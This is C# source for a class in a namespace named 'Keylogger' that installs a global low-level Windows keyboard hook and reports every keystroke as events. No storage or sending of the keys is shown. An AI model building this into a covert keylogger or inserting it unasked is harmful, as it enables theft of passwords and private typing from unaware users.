using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    public class KeyboardHook
    {
        [DllImport("User32.dll")]
        public static extern IntPtr SetWindowsHookEx(HookType idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("User32.dll")]
        public static extern int CallNextHookEx(IntPtr idHook, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("User32.dll")]
        public static extern short GetKeyState(Keys nVirtKey);
        

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("User32.dll", SetLastError = true)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("User32.dll", SetLastError = true)]
        public static extern int GetKeyboardState(byte[] pbKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);

        public delegate int HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        public delegate void KeyEventHandler(object sender, KeyEventArgs e);
        public delegate void KeyPressEventHandler(object sender, KeyPressEventArgs e);

        public event KeyEventHandler KeyDown;
        public event KeyPressEventHandler KeyPress;
        public event KeyEventHandler KeyUp;

        private readonly IntPtr keyboardHandle;
        private readonly IntPtr moduleHandle;
        private readonly HookProc keyboardHookProc;

        public KeyboardHook()
        {
            moduleHandle = GetMainModuleHandle();
            keyboardHookProc = KeyboardHookProcedure;
            keyboardHandle = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, keyboardHookProc, moduleHandle, 0);
            if (keyboardHandle == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }

        ~KeyboardHook()
        {
            Stop();
        }

        public void Stop()
        {
            if (keyboardHandle != IntPtr.Zero && !UnhookWindowsHookEx(keyboardHandle))
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }

        private int KeyboardHookProcedure(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 || (KeyDown == null && KeyUp == null && KeyPress == null))
            {
                return CallNextHookEx(keyboardHandle, nCode, wParam, lParam);
            }

            var handled = false;
            var msg = (WindowMessages)wParam.ToInt32();
            var keyboardHookStruct = (KbdLowLevelHookStruct)Marshal.PtrToStructure(lParam, typeof(KbdLowLevelHookStruct));
            var keyData = (Keys)keyboardHookStruct.vkCode;

            if (msg == WindowMessages.WM_KEYDOWN || msg == WindowMessages.WM_SYSKEYDOWN)
            {
                keyData = AdjustKeyDataWithModifiers(keyData);

                if (KeyDown != null)
                {
                    var e = new KeyEventArgs(keyData);
                    KeyDown(this, e);
                    handled = e.Handled;
                }
            }
            else if (msg == WindowMessages.WM_KEYUP || msg == WindowMessages.WM_SYSKEYUP)
            {
                keyData = AdjustKeyDataWithModifiers(keyData);

                if (KeyUp != null)
                {
                    var e = new KeyEventArgs(keyData);
                    KeyUp(this, e);
                    handled |= e.Handled;
                }
            }

            if (msg == WindowMessages.WM_KEYDOWN || msg == WindowMessages.WM_SYSKEYDOWN)
            {
                if (KeyPress != null)
                {
                    handled |= HandleKeyPress(keyboardHookStruct);
                }
            }

            return handled ? 1 : CallNextHookEx(keyboardHandle, nCode, wParam, lParam);
        }

        private Keys AdjustKeyDataWithModifiers(Keys keyData)
        {
            if (IsPressed(Keys.LMenu) || IsPressed(Keys.RMenu))
            {
                keyData |= Keys.Alt;
            }

            if (IsPressed(Keys.LControlKey) || IsPressed(Keys.RControlKey))
            {
                keyData |= Keys.Control;
            }

            if (IsPressed(Keys.ShiftKey))
            {
                keyData |= Keys.Shift;
            }

            return keyData;
        }

        private static bool IsPressed(Keys keys)
        {
            return (GetKeyState(keys) & 0x8000) != 0;
        }

        private bool HandleKeyPress(KbdLowLevelHookStruct keyboardHookStruct)
        {
            bool handled = false;
            var keyStates = new byte[256];
            GetKeyboardState(keyStates);

            var sb = new StringBuilder(5);
            if (ToUnicode(keyboardHookStruct.vkCode, keyboardHookStruct.scanCode, keyStates, sb, sb.Capacity, 0) > 0)
            {
                var key = sb.ToString()[0];
                var e = new KeyPressEventArgs(key);
                KeyPress(this, e);
                handled = e.Handled;
            }

            return handled;
        }

        public static IntPtr GetMainModuleHandle()
        {
            using (var process = Process.GetCurrentProcess())
            using (var module = process.MainModule)
                return GetModuleHandle(module.ModuleName);
        }
    }
}
